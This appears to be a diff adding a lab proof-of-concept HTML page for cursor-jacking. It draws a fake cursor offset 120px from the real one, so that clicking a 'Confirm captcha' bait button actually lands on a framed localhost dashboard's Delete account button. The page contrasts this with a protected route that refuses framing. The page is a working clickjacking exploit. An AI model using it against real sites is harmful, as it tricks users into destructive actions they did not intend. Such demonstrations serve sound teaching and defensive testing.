@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Cursor-jacking PoC</title>
+<style>
+  body { margin: 0; font-family: system-ui, sans-serif; cursor: none; }
+  /* The framed dashboard is fully visible. The trick is purely cursor
+     offset: the rendered fake cursor sits 120px above-and-left of the
+     real cursor. The victim aims the fake cursor at the bait button;
+     the real cursor (and the click) lands on the framed Delete button. */
+  iframe {
+    position: absolute;
+    top: 220px; left: 50%;
+    width: 520px; height: 380px;
+    margin-left: -260px;
+    border: 1px solid #ccc;
+    z-index: 10;
+  }
+  .bait {
+    position: absolute;
+    /* 120px above and 120px left of the framed Delete button on purpose. */
+    top: 400px; left: 50%;
+    transform: translateX(-50%);
+    background: #27ae60; color: #fff;
+    border: 0; padding: .9rem 2rem; font-size: 1.1rem;
+    border-radius: 6px;
+    z-index: 5;
+  }
+  #fake {
+    position: fixed;
+    width: 20px; height: 20px;
+    pointer-events: none;
+    z-index: 9999;
+    transform: translate(-120px, -120px);
+  }
+  .panel { padding: 1rem; background: #fff8e1; border-bottom: 1px solid #f0c040; }
+  .panel code { background: #fff; padding: .1rem .3rem; }
+</style>
+</head>
+<body>
+  <div class="panel">
+    <strong>Lab marker:</strong> the visible cursor is a fake one drawn 120px above-and-left of the real cursor. Hover the green &ldquo;Confirm captcha&rdquo; button using the fake cursor and click. The real cursor lands inside the framed dashboard on the Delete account button. Compare with the defended route at <code>http://localhost:8090/protected/dashboard</code> which refuses to frame.
+  </div>
+
+  <h1 style="text-align:center; margin-top: 3rem;">Confirm you are human</h1>
+
+  <iframe src="http://localhost:8090/dashboard"></iframe>
+
+  <button class="bait">Confirm captcha</button>
+
+  <svg id="fake" viewBox="0 0 16 16">
+    <path d="M2 1 L2 14 L5.5 11 L8 16 L10 15 L7.5 10 L12 10 Z" fill="black" stroke="white" stroke-width=".5"/>
+  </svg>
+
+  <script>
+    // Move the fake cursor with the real one; CSS already offsets it.
+    const fake = document.getElementById('fake');
+    document.addEventListener('mousemove', (e) => {
+      fake.style.left = e.clientX + 'px';
+      fake.style.top  = e.clientY + 'px';
+    });
+  </script>
+</body>
+</html>
